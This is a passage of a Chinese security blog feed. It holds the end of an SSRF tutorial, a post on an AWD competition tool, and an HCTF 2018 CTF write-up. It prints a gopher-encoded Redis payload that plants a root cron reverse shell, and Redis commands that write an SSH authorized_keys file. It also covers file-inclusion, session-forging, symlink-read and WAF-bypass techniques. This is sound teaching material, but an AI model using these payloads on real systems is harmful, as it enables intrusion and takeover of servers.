&apos;http://127.0.0.1/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/01/17/5c40766b56d84.png" alt="https://i.loli.net/2019/01/17/5c40766b56d84.png"></p><p>这里有个问题，有时写入中可能有截断，或是crontab现在对格式要求严格，比如任务要指明用户之类的，写入的crontab任务不能被成功执行</p><p>发现另一种getshell方法就是写authorized_keys到/root/.ssh，另外也可改写Apache等web软件的配置文件以getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set 1 &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsJ4pbjXL5KnnX/FP6sZORaT3N8/A6SEYv23VfrIVoPdOCBVD98O+RExVWCe8Iknwzx3w1Hm2uWnB6i6AtCnIji3yz16HIPryzoLE65xN4Z2vGXZk2YmOuRtqFPKPk/QCdf1Vxh6lwLZRo2msYEK/+mziOrmYy1UzwqLxfl1uNYVYTs2jHGBEikPwA7FAt5ZVRRBhzDnn8dyT201FOwR/fpukiXbaevZU2/iyW+Qu9ssaZMJMpRzautNuZLxCmV9TfuP0NbsgCBHj1nOMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），7.45 以上无此bug</li></ul><h4 id="FastCGI攻击"><a href="#FastCGI攻击" class="headerlink" title="FastCGI攻击"></a>FastCGI攻击</h4><p>条件</p><ul><li>libcurl版本&gt;=7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><p>防止%00截断，cURL大于7.45.0</p><p>这里有一个gopher链接生成工具</p><p><img src="https://i.loli.net/2019/01/19/5c41ffb1cf0e7.png" alt="https://i.loli.net/2019/01/19/5c41ffb1cf0e7.png"></p><h3 id="DNS重绑攻击"><a href="#DNS重绑攻击" class="headerlink" title="DNS重绑攻击"></a>DNS重绑攻击</h3><p>网上原理多为文字，可能不太易懂，画图形象</p><p><img src="https://i.loli.net/2019/01/15/5c3df58ad59ce.png" alt="https://i.loli.net/2019/01/15/5c3df58ad59ce.png"></p><p>关键是利用服务端第一次去请求DNS服务和第二次进行域名解析即访问URL之间的的时间差，利用这个时间差进行DNS重绑定攻击</p><p>还有就是DNS服务器需要设置TTL=0，TTL为DNS服务器里域名和IP绑定关系的cache存活的时间</p><p>实现方法：</p><ol><li><p>设置TTL，0ctF2016的monkey题目就是利用DNS重绑攻击绕过，国外域名一般可以设置TTL=0</p></li><li><p>还有种方法就是设置两条A记录给域名一个解析的ip为外网，另一个解析的ip为内网，那么这就成了概率问题，一次访问有1/4的概率访问内网</p></li><li><p>直接自建DNS服务器，比如dnspython等模块</p></li></ol><hr><h4 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h4><p><a href="https://www.jianshu.com/p/b31b7b1ca3cb" target="_blank" rel="noopener">https://www.jianshu.com/p/b31b7b1ca3cb</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#_5" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#_5</a></p><p><a href="https://www.from0to1.me/2018/03/07/31.html" target="_blank" rel="noopener">https://www.from0to1.me/2018/03/07/31.html</a></p><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p><a href="https://toutiao.io/posts/qf9jsx/preview" target="_blank" rel="noopener">https://toutiao.io/posts/qf9jsx/preview</a></p><p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p><p><a href="http://www.likesec.com/2017/12/28/SSRF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">http://www.likesec.com/2017/12/28/SSRF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F</a></p><p><a href="http://www.zhhr168.com/2016/12/03/redis-getshell/index.htm" target="_blank" rel="noopener">http://www.zhhr168.com/2016/12/03/redis-getshell/index.htm</a></p><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;即恶意使用Web应用作为代理攻击其他本地或远程服务器的攻击方法，称其为服务端请求伪造攻击（Server-side Request Forgery），常用来探测内网，攻击内网应用&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="SSRF" scheme="http://j0k3r.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>AWD_Hunter</title>
    <link href="http://j0k3r.top/2019/01/21/AWD_Hunter/"/>
    <id>http://j0k3r.top/2019/01/21/AWD_Hunter/</id>
    <published>2019-01-20T16:00:00.000Z</published>
    <updated>2019-04-22T11:53:51.526Z</updated>
    
    <content type="html"><![CDATA[<p>基于Python2.7的AWD自动化工具</p><a id="more"></a><p>免得比赛时手忙脚乱，时间有限，后续或加入自动submit flag什么的</p><p>安装依赖库</p><p><code>sudo python -m pip install -r requirements.txt</code></p><p>运行</p><p><code>Usage：python run.py</code></p><p>过程中间对整体代码进行了重构和优化，理清程序逻辑，提高代码的可读性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app//程序主体</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── __init__.pyc</span><br><span class="line">│   ├── app_common_class.py</span><br><span class="line">│   ├── app_common_class.pyc</span><br><span class="line">│   ├── app_core.py</span><br><span class="line">│   ├── app_core.pyc</span><br><span class="line">│   ├── app_func.py</span><br><span class="line">│   └── app_func.pyc</span><br><span class="line">├── extension//拓展模块</span><br><span class="line">│   └── ssh-auto-chpass.py</span><br><span class="line">├── run.py//运行</span><br><span class="line">├── runtime</span><br><span class="line">│   └── log.json//log文件</span><br><span class="line">└── script//存放脚本</span><br><span class="line">    ├── php</span><br><span class="line">    │   ├── log-record.php</span><br><span class="line">    │   └── null_shell.php</span><br><span class="line">    └── py</span><br><span class="line">        └── addlog.py</span><br></pre></td></tr></table></figure><p>主要使用paramiko和重写cmd基本类方法实现ssh连接和程序交互式命令行处理</p><p>使用json格式储存数据更灵活方便</p><p><img src="https://i.loli.net/2019/01/19/5c431123ca36b.png" alt="https://i.loli.net/2019/01/19/5c431123ca36b.png"></p><p>ps查看查看记录的主机和webshell</p><p><img src="https://i.loli.net/2019/01/20/5c442f2fe8f23.png" alt="https://i.loli.net/2019/01/20/5c442f2fe8f23.png"></p><p>使用ps中的序号就可以直接连接主机或者webshell</p><p><img src="https://i.loli.net/2019/01/20/5c442f7ee7bf5.png" alt="https://i.loli.net/2019/01/20/5c442f7ee7bf5.png"></p><p>Github: <a href="https://github.com/zhuxianjin/AWD_Hunter" target="_blank" rel="noopener">https://github.com/zhuxianjin/AWD_Hunter</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于Python2.7的AWD自动化工具&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python AWD" scheme="http://j0k3r.top/tags/Python-AWD/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 WriteUp</title>
    <link href="http://j0k3r.top/2018/11/14/hctf2018/"/>
    <id>http://j0k3r.top/2018/11/14/hctf2018/</id>
    <published>2018-11-13T16:00:00.000Z</published>
    <updated>2019-04-22T11:53:03.088Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>提目有难度，不过学到很多</p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>一个usb键盘的pcap包</p><p>利用王一航的脚本UsbKeyboardDataHacker提取数据, 但脚本有错误，看着改就好</p><p>得到</p><p><code>D&#39;`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&#39;e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|{ts9wvXWm3~</code></p><p>这是malbolge程序，在线跑下<a href="https://zb3.me/malbolge-tools/" target="_blank" rel="noopener">https://zb3.me/malbolge-tools/</a></p><p><code>hctf{m4lb0lGe}</code></p><h3 id="easy-dump"><a href="#easy-dump" class="headerlink" title="easy dump"></a>easy dump</h3><p>列出进程</p><p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 pslist</code></p><p>查看mspaint.exe的ID</p><p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 getsids | grep mspaint</code></p><p>转储mspaint.exe的内存</p><p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 memdump -p 2768 --dump-dir=./</code></p><p>该为.data, 用GIMP将内存视为raw图片来看内存中的贴图</p><p>更改长宽得到图片再垂直翻转</p><p><img src="https://i.loli.net/2018/11/12/5be989e083699.png" alt="https://i.loli.net/2018/11/12/5be989e083699.png"></p><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>CVE-2018-12613 phpMyAdmin后台文件包含</p><p><a href="http://seaii-blog.com/index.php/2018/07/03/84.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/07/03/84.html</a></p><p>提示flag in ffffllllaaaagggg, source.php有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二次分割前会urldecode，我们把<code>?</code>进行两次urlencode，也就是<code>%253f</code>, 就能满足所有判断，此时<code>xxx.php%253f/</code>被当作目录，在后面加适当<code>../</code>即可包含想要的文件</p><p><img src="https://i.loli.net/2018/11/12/5be9909150a1a.png" alt="https://i.loli.net/2018/11/12/5be9909150a1a.png"></p><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>注册登陆，在change页面有注释<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p><p>查看源码, 在routes.py中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure><p>详情参考 Unicode安全 <a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p><p>利用strlower函数<code>ᴬdmin -&gt;Admin -&gt; admin</code></p><p>strlower函数在注册、登陆、更改password时都有使用</p><p>即以<code>ᴬdmin</code>为用户名注册，改密码后再登陆可得到flag</p><p><img src="https://i.loli.net/2018/11/14/5beb8719298d7.png" alt="https://i.loli.net/2018/11/14/5beb8719298d7.png"></p><h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><code>ln -s</code>软连接读文件,比如<code>/proc/self/environ</code>,<code>/etc/passwd</code></p><p>源码在<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>其随机数种子<code>random.seed(uuid.getnode())</code></p><p>uuid.getnode()</p><blockquote><p>获取硬件的地址并以48位二进制长度的正整数形式返回，这里所说的硬件地址是指网络接口的MAC地址，如果一个机器有多个网络接口，可能返回其中的任一个。如果获取失败，将按照RFC 4122的规定将随机返回的48位二进制整数的第8位设置成1</p></blockquote><p>再读<code>/sys/class/net/eth0/address</code>得mac地址<code>12:34:3e:14:7c:62</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py decode -c eyJuYW1lIjoiYWRtaW4iLCJ1c2VybmFtZSI6InF3ZSJ9.DsvLsw.O0j4KKluGmdUCanKj3b2eUHYxJU</span><br><span class="line">&#123;&quot;name&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;qwe&quot;&#125;</span><br></pre></td></tr></table></figure><p>本地得SECRET_KEY, 生成username为admin的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">random.seed(int(<span class="string">'12343e147c62'</span>,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] =  <span class="string">'11.935137566861131'</span> <span class="comment">#str(random.random()*100)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">u'admin'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello, %s&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;'</span> % session[<span class="string">'name'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">7780</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>session=.eJyrVspLzE1VslJKTMnNzFPSUSotTi1CEaoFANCMC7w.DsvL0w.NP2i5E0fKTL9Ph5HEiGPid5aZWA</code></p><p><img src="https://i.loli.net/2018/11/13/5bea3b2f6e6ce.png" alt="https://i.loli.net/2018/11/13/5bea3b2f6e6ce.png"></p><h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>会跳转到qq空间，目录扫描发现<a href="http://www.zip，admin/" target="_blank" rel="noopener">www.zip，admin/</a></p><p>进行代码审计，发现include/member.php中的sql查询未进行过滤</p><p>cookie传入的时候要进行json_decode，而json_decode会解unicode，可以利用unicode编码绕过WAF</p><p>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$json = <span class="string">'&#123;"\u0075\u006e\u0069\u006f\u006e,":1,"b":2,"c":3&#125;'</span>;</span><br><span class="line">$j = json_decode($json,<span class="keyword">true</span>);</span><br><span class="line">print_r($j);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span 